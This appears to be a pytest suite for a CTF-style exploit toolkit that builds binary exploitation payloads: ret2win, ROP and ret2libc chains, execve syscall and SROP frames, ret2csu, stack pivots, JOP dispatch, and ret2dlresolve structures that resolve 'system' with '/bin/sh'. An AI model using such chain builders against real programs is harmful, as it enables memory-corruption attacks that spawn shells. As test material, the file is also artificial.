"""Deterministic structure and ABI tests for r5b userland chain builders."""
from pathlib import Path
import struct
import sys

import pytest

REPO = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO / "solvers" / "toolkits"))

import userland_chains as chains  # noqa: E402
from gadget_catalog import Gadget, GadgetCatalog  # noqa: E402
from contract import BuildError, PayloadBuild  # noqa: E402


def _word(build: PayloadBuild, label: str) -> int:
    return int.from_bytes(build.slice(label), "little")


def test_ret2win_and_tuple_contract_expose_exact_placements():
    build = chains.build_ret2win(
        win_address=0x401176,
        overflow_offset=40,
        alignment_ret=0x40101A,
        return_address=0x401000,
    )
    payload, placements = build
    assert payload[:40] == b"A" * 40
    assert placements["alignment_ret"] == 40
    assert _word(build, "win_address") == 0x401176
    assert _word(build, "return_address") == 0x401000
    assert build.absolute_placements()["win_address"] == placements["win_address"]


def test_amd64_rop_calls_and_i386_cdecl_cleanup_are_abi_shaped():
    amd64 = chains.build_rop_calls(
        (
            chains.CallSpec(0x401030, (1, 0x404000, 8), "write"),
            chains.CallSpec(0x401050, (0, 0x404100, 16), "read"),
        ),
        overflow_offset=24,
        pop_gadgets={"rdi": 0x401201, "rsi": 0x401203, "rdx": 0x401205},
        alignment_ret=0x40101A,
        final_return=0x401080,
    )
    assert _word(amd64, "call[0].arg[0]_rdi") == 1
    assert _word(amd64, "call[0].function_write") == 0x401030
    assert _word(amd64, "call[1].arg[2]_rdx") == 16
    assert _word(amd64, "final_return") == 0x401080

    i386 = chains.build_rop_call(
        function=0x8049040,
        arguments=(1, 0x804C000, 4),
        overflow_offset=12,
        architecture="i386",
        cleanup_gadget=0x8049200,
        return_address=0x8049060,
        name="write",
    )
    assert _word(i386, "call[0].function_write") == 0x8049040
    assert _word(i386, "call[0].cleanup") == 0x8049200
    assert _word(i386, "call[0].arg[2]") == 4
    assert _word(i386, "final_return") == 0x8049060


@pytest.mark.parametrize(
    ("version", "profile"),
    [("2.17", "legacy"), ("2.27", "tcache-hooks"), ("2.34", "hookless"), ("2.40", "modern")],
)
def test_ret2libc_multiple_glibc_profiles(version, profile):
    build = chains.build_ret2libc(
        system_address=0x7FFFF7E12340,
        command_address=0x7FFFF7F65031,
        overflow_offset=72,
        glibc_version=version,
        pop_rdi=0x4012A3,
        alignment_ret=0x40101A,
        exit_address=0x7FFFF7E04560,
    )
    assert build.strategy == "ret2libc-system"
    assert build.metadata["glibc_profile"] == profile
    assert _word(build, "call[0].arg[0]_rdi") == 0x7FFFF7F65031
    assert _word(build, "call[0].function_system") == 0x7FFFF7E12340

    i386 = chains.build_ret2libc(
        system_address=0xF7E12340,
        command_address=0xF7F65031,
        overflow_offset=44,
        glibc_version=version,
        architecture="i386",
        exit_address=0xF7E04560,
    )
    assert _word(i386, "system") == 0xF7E12340
    assert _word(i386, "exit") == 0xF7E04560
    assert _word(i386, "command") == 0xF7F65031


def test_raw_syscall_builder_controls_only_supplied_registers():
    build = chains.build_syscall_rop(
        syscall_number=59,
        registers={"rdi": 0x404800, "rsi": 0, "rdx": 0},
        pop_gadgets={
            "rax": 0x401100, "rdi": 0x401102, "rsi": 0x401104, "rdx": 0x401106,
        },
        syscall_gadget=0x401108,
        overflow_offset=8,
    )
    assert _word(build, "value_rax") == 59
    assert _word(build, "value_rdi") == 0x404800
    assert _word(build, "syscall_gadget") == 0x401108
    assert "value_r10" not in build.placements


def test_catalog_integrated_auto_builders_select_only_exact_semantics():
    rows = (
        Gadget(0x401001, 1, "ret", b"\xc3", 8),
        Gadget(0x401010, 0x10, "pop rax ; ret", b"\x58\xc3", 16, ("rax",)),
        Gadget(0x401020, 0x20, "pop rdi ; ret", b"\x5f\xc3", 16, ("rdi",)),
        Gadget(0x401030, 0x30, "syscall ; ret", b"\x0f\x05\xc3", 8),
        Gadget(0x401034, 0x34, "jmp rax", b"\xff\xe0", 0),
        Gadget(0x401036, 0x36, "call rbx", b"\xff\xd3", 8),
        Gadget(0x401040, 0x40, "csu pop rbx rbp r12 r13 r14 r15 ; ret",
               bytes.fromhex("5b5d415c415d415e415fc3"), 56),
        Gadget(0x401050, 0x50, "csu call [r12+rbx*8] (r13d,r14,r15)",
               bytes.fromhex("4c89fa4c89f64489ef41ff14dc"), 0),
    )
    catalog = GadgetCatalog("amd64", 64, "little", 2, 0x401000, rows)
    call = chains.build_rop_call_from_catalog(
        catalog, function=0x401200, arguments=(0x404800,),
        overflow_offset=8, return_address=0x401000, align_stack=True,
    )
    assert call.strategy == "rop-call-from-catalog"
    assert _word(call, "call[0].pop_rdi") == 0x401020
    assert _word(call, "alignment_ret") == 0x401001

    syscall = chains.build_syscall_rop_from_catalog(
        catalog, syscall_number=60, registers={"rdi": 0}, overflow_offset=8,
    )
    assert _word(syscall, "pop_rax") == 0x401010
    assert _word(syscall, "syscall_gadget") == 0x401030

    csu = chains.build_ret2csu_from_catalog(
        catalog, function_table=0x404018, arg1=1, arg2=2, arg3=3,
        overflow_offset=8, return_address=0x401000,
    )
    assert csu.strategy == "ret2csu-from-catalog"
    assert _word(csu, "csu_pop") == 0x401040
    assert _word(csu, "csu_call") == 0x401050

    libc = chains.build_ret2libc_from_catalog(
        catalog, system_address=0x7FFFF7E12340, command_address=0x7FFFF7F65031,
        overflow_offset=8, glibc_version="2.39",
    )
    assert libc.strategy == "ret2libc-from-catalog"
    assert _word(libc, "call[0].pop_rdi") == 0x401020

    jop = chains.build_jop_dispatch_from_catalog(
        catalog, dispatcher_semantic="jmp rax", functional_semantics=("call rbx",),
        table_address=0x600020, payload_address=0x600000, overflow_offset=8,
    )
    assert jop.strategy == "jop-dispatch-from-catalog"
    assert _word(jop, "dispatcher_gadget") == 0x401034
    assert _word(jop, "table[0]") == 0x401036

    dlresolve = chains.build_ret2dlresolve_from_catalog(
        catalog, plt0=0x401020, rel_plt=0x400500, dynsym=0x400300,
        dynstr=0x400400, relocation_target=0x404018,
        payload_address=0x404800, overflow_offset=8, glibc_version="2.39",
    )
    assert dlresolve.strategy == "ret2dlresolve-from-catalog"
    assert _word(dlresolve, "pop_rdi") == 0x401020


@pytest.mark.parametrize("variant", ["r13-r14-r15", "r12-r13-r14"])
def test_ret2csu_serializes_loop_guard_call_base_and_epilogue(variant):
    build = chains.build_ret2csu(
        csu_pop=0x4012BA,
        csu_call=0x4012A0,
        function_table=0x404018,
        arg1=1,
        arg2=0x404800,
        arg3=0x80,
        overflow_offset=56,
        return_address=0x401080,
        variant=variant,
    )
    assert _word(build, "setup_rbx") == 0
    assert _word(build, "setup_rbp") == 1
    assert _word(build, "setup_r12" if variant == "r13-r14-r15" else "setup_r15") == 0x404018
    assert all(_word(build, f"epilogue[{index}]") == 0 for index in range(7))
    assert build.metadata["variant"] == variant


@pytest.mark.parametrize("strategy", ["pop-sp", "xchg-acc-sp", "leave-ret"])
def test_stack_pivot_strategies(strategy):
    build = chains.build_stack_pivot(
        pivot_address=0x404800,
        pivot_gadget=0x401300,
        setup_gadget=None if strategy == "pop-sp" else 0x401302,
        overflow_offset=32,
        strategy=strategy,
    )
    assert _word(build, "pivot_address") == 0x404800
    assert build.strategy.endswith(strategy)
    if strategy != "pop-sp":
        assert _word(build, "pivot_gadget") == 0x401300


def test_jop_dispatch_table_lands_at_exact_caller_supplied_address():
    base = 0x600000
    table = base + 0x40
    build = chains.build_jop_dispatch(
        dispatcher_gadget=0x401500,
        functional_gadgets=(0x401510, 0x401520, 0x401530),
        table_address=table,
        payload_address=base,
        overflow_offset=8,
        pop_dispatch_register=0x401505,
        terminal_gadget=0x4015FF,
    )
    assert build.absolute_placements()["table[0]"] == table
    assert _word(build, "table[2]") == 0x401530
    assert _word(build, "table_terminal") == 0x4015FF


@pytest.mark.parametrize("architecture", ["amd64", "i386"])
def test_sigreturn_frames_match_pwntools_reference_when_available(architecture):
    pytest.importorskip("pwnlib")
    from pwnlib.context import context
    from pwnlib.rop.srop import SigreturnFrame

    with context.local(
        arch=architecture,
        bits=64 if architecture == "amd64" else 32,
        os="linux",
        endian="little",
    ):
        if architecture == "amd64":
            values = {"rax": 59, "rdi": 0x404800, "rsp": 0x404900, "rip": 0x401050}
            reference = SigreturnFrame(arch="amd64", kernel="amd64")
        else:
            values = {"eax": 11, "ebx": 0x804C000, "esp": 0x804C100, "eip": 0x8049050}
            reference = SigreturnFrame(arch="i386", kernel="i386")
        for name, value in values.items():
            setattr(reference, name, value)
        expected = bytes(reference)
    build = chains.build_sigreturn_frame(values, architecture=architecture)
    assert build.payload == expected
    for name, value in values.items():
        assert _word(build, f"frame.{name}") == value


def test_srop_execve_trigger_and_frame_offsets_round_trip():
    build = chains.build_srop_execve(
        syscall_gadget=0x401050,
        pop_accumulator=0x401052,
        command_address=0x404800,
        stack_address=0x404900,
        overflow_offset=40,
    )
    assert _word(build, "sigreturn_number") == 15
    assert _word(build, "frame.rax") == 59
    assert _word(build, "frame.rdi") == 0x404800
    assert _word(build, "frame.rip") == 0x401050
    assert len(build.slice("sigreturn_frame")) == 248


def test_amd64_ret2dlresolve_forges_rela_sym_strings_and_selector():
    base = 0x404800
    build = chains.build_ret2dlresolve(
        plt0=0x401020,
        rel_plt=0x400500,
        dynsym=0x400300,
        dynstr=0x400400,
        relocation_target=0x404018,
        pop_rdi=0x4012A3,
        payload_address=base,
        overflow_offset=64,
        glibc_version="2.39",
        resolver_return=0x401080,
    )
    rela = build.slice("fake_relocation")
    r_offset, r_info, addend = struct.unpack("<QQq", rela)
    assert r_offset == 0x404018 and addend == 0 and (r_info & 0xFFFFFFFF) == 7
    st_name, st_info, _other, _shndx, _value, _size = struct.unpack(
        "<IBBHQQ", build.slice("fake_symbol")
    )
    assert st_info == 0x12
    assert st_name == build.absolute_placements()["symbol_string"] - 0x400400
    assert build.slice("symbol_string") == b"system\x00"
    assert build.slice("argument_string") == b"/bin/sh\x00"
    expected_selector = (build.absolute_placements()["fake_relocation"] - 0x400500) // 24
    assert _word(build, "relocation_selector") == expected_selector
    assert _word(build, "argument_pointer") == build.absolute_placements()["argument_string"]


def test_i386_ret2dlresolve_uses_rel_byte_offset_and_elf32_structures():
    base = 0x804A800
    build = chains.build_ret2dlresolve(
        plt0=0x8049020,
        rel_plt=0x8048300,
        dynsym=0x8048200,
        dynstr=0x8048280,
        relocation_target=0x804C018,
        pop_rdi=None,
        payload_address=base,
        overflow_offset=44,
        glibc_version="2.27",
        architecture="i386",
        resolver_return=0x8049080,
    )
    r_offset, r_info = struct.unpack("<II", build.slice("fake_relocation"))
    assert r_offset == 0x804C018 and (r_info & 0xFF) == 7
    assert len(build.slice("fake_symbol")) == 16
    assert _word(build, "relocation_selector") == (
        build.absolute_placements()["fake_relocation"] - 0x8048300
    )
    assert build.metadata["selector_kind"] == "rel-byte-offset"


def test_builders_reject_missing_gadgets_bad_versions_overlaps_and_bad_bytes():
    with pytest.raises(BuildError, match="missing pop gadget for rdi"):
        chains.build_rop_call(function=1, arguments=(2,), overflow_offset=0)
    with pytest.raises(BuildError, match="glibc_version"):
        chains.glibc_profile("latest")
    with pytest.raises(BuildError, match="overlaps"):
        chains.build_jop_dispatch(
            dispatcher_gadget=1,
            functional_gadgets=(2,),
            table_address=0x1001,
            payload_address=0x1000,
            overflow_offset=8,
            pop_dispatch_register=3,
        )
    with pytest.raises(BuildError, match="forbidden bytes"):
        chains.build_ret2win(win_address=0x4141414141414141, overflow_offset=0, bad_bytes={0x41})

